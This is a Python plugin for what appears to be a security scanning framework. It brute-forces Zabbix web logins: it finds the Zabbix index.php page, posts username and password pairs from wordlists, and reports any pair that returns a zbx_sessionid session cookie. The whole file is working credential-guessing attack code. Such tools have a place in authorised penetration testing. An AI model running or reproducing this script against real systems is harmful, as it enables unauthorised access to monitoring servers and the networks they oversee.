#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.core.env import *
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("zabbix_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("zabbix_passwords.txt")

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./zabbix/', './']):
                    if '?' not in path:
                        url = path + "index.php"
                        async with session.get(url=url) as res:
                            if res and res.status == 200:
                                text = await res.text()
                                if 'zabbix' in text:
                                    async for username, password in self.generate_auth_dict(self.username_list, self.password_list):
                                        data = "name=" + username + "&password=" + password + "&autologin=1&enter=Sign+in"
                                        async with session.post(url=url, data=data, allow_redirects=False) as res:
                                            if res and res.status == 301 and 'Set-Cookie' in res.headers.keys() and 'zbx_sessionid' in res.headers['Set-Cookie']:
                                                detail = username + "/" + password
                                                yield f"{url}   {detail}"
                                                
